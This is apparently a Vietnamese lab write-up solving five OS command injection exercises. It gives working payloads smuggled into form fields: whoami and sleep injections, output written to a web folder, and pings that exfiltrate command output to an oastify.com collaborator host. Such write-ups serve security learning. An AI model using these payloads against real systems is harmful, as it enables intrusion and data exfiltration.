# 1. OS command injection, simple case
Trong chức năng check stock, ta thấy body có dạng `productId=2&storeId=1`

Thử thay đổi body thành `productId=2&storeId=1'` thì thấy hiển thị lỗi `sh: 1: Syntax error:Unterminated quoted string`. Như vậy, server sử dụng hai biến productId và storeId để truyền vào một lệnh command, thực thi rồi trả về kết quả tương ứng.

Thay đổi body để thực thi câu lệnh whoami: `productId=2&storeId=1;whoami`, ta thu được kết quả mong muốn

![image](https://user-images.githubusercontent.com/103978452/202739993-e5acd98b-fd43-4d42-a90e-abde76bffc9d.png)

# 2. Blind OS command injection with time delays
Trong chức năng feedback, ta thấy response trả về chỉ là một object rỗng. Như vậy đây là blind OS command injection.

Body của request tới /feedback/submit có dạng `csrf=...&name=my_name&email=my_mail@gmail.com&subject=my_subject&mesage=my_message`. Lần lượt thử thêm `%22%3Bsleep+10%3Becho+%22` (ứng với `";sleep 10;echo "` sau khi URL decode) vào sau các trường name, email, subject và message. 

Ta thấy với body `csrf=Mfd0vSTsKCnatqeVnSeJaohf5YXVKSCV&name=triet%22%3Bsleep+10%3Becho+%2& email=trang%40gmail.com2&subject=trung&message=helloooo` thì response bị delay 10 giây. Như vậy, kết quả thành công.

# 3. Blind OS command injection with output redirection
Như trong lab description, các images của server được lưu trong /var/www/images

Trong chức năng feedback, thêm đoạn code sau vào sau tham số name: 
`%22%3B%77%68%6F%61%6D%69%3E%2F%76%61%72%2F%77%77%77%2F%69%6D%61%67%65%73%2F%68%65%6C%6C%6F%2E%74%78%74%3B%65%63%68%6F%20%22`, tương ứng `";whoami>/var/www/images/hello.txt;echo "` sau khi URL decode. Đoạn code này sẽ thực thi lệnh whoami và đưa nội dung vào file /var/www/images/hello.txt

Truy cập URL `/images?filename=hello.txt`, ta có được nội dung của lệnh command whoami

![image](https://user-images.githubusercontent.com/103978452/202840364-69225135-eaf3-43bd-ba93-da0137d0249b.png)

# 4. Blind OS command injection with out-of-band interaction
Trong chức năng feedback, ta thay đổi tham số username:
`name=test%22%3B%70%69%6E%67%20%77%77%77%79%6F%74%37%79%63%66%61%6E%6C%73%61%35%6D%6A%76%6D%68%34%79%65%76%35%31%76%70%6B%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22`, tương ứng `name=test";ping wwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com;echo "` sau khi URL decode.

![image](https://user-images.githubusercontent.com/103978452/202840899-8f8acbec-5225-4971-b130-a593ee2e07ff.png)

Sau khi gửi request, kiểm tra trong BurpCollaborator client thì thấy có request được gửi đến

![image](https://user-images.githubusercontent.com/103978452/202840925-0bf184d6-cffd-4895-a8c7-f6f3bac49a44.png)

# 5. Blind OS command injection with out-of-band data exfiltration
Thử sử dụng payload như trong challenge #4, ta thấy kết quả vẫn thành công.

Ta sẽ lấy dữ liệu bằng cách thay đổi subdomain trong URL của Burp Collaborator Server. Trong phần body của request POST /feedback/submit, ta thay đổi tham số name thành `name=%22%3B%70%69%6E%67%20%60%77%68%6F%61%6D%69%60%77%77%77%79%6F%74%37%79%63%66%61%6E%6C%73%61%35%6D%6A%76%6D%68%34%79%65%76%35%31%76%70%6B%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22` (tương ứng `name=";ping `whoami`wwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com;echo "` sau khi URL decode)

Sau khi nhấn send, vào Burp Collaborator Client kiểm tra thì thấy có một request với URL "peter-msIKBjwwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com", phần "peter-msIKBj" chính là kết quả của lệnh whoami.

![image](https://user-images.githubusercontent.com/103978452/202841656-f63309f1-cec9-41da-95cc-af6378c6e77b.png)

Sử dụng thông tin đã có để submit solution, kết quả thành công.
